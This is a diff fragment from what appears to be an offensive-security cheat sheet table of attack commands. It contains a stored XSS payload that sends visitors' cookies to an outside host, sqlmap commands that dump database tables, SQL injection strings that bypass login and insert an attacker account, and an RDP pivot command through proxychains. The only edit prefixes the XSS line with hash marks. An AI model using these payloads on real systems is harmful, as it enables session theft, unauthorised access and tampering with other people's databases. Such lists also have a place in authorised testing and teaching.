@@ -168,7 +168,7 @@ proxychains xfreerdp /v:Victim_IP /u:Administrator #If pivot
 
 | Description | Command |
 | --- | --- |
-| Stored XSS, Cookie Steal Script | <a onclick="document.location='http://www.oceanplaza.com/Default.aspx?cookie='+escape(document.cookie);" href=#> trust me </ar> |
+| Stored XSS, Cookie Steal Script | #####<a onclick="document.location='http://www.oceanplaza.com/Default.aspx?cookie='+escape(document.cookie);" href=#> trust me </ar> |
 | IDOR | Visit Profile Pages or any other pages and change the ID |
 | SQLI | Sqlmap -r for_sql.req --dumps --tables<br/><br/><br/>Sqlmap -u 'domain' -X POST --data "<Paste the Request>" --dumps --tables<br/><br/>admin' OR 1=1 --<br/><br/>admin' ;insert into login values('superman','superman123');--<br/><br/>admin' ;create database kryptonite;-- |
 
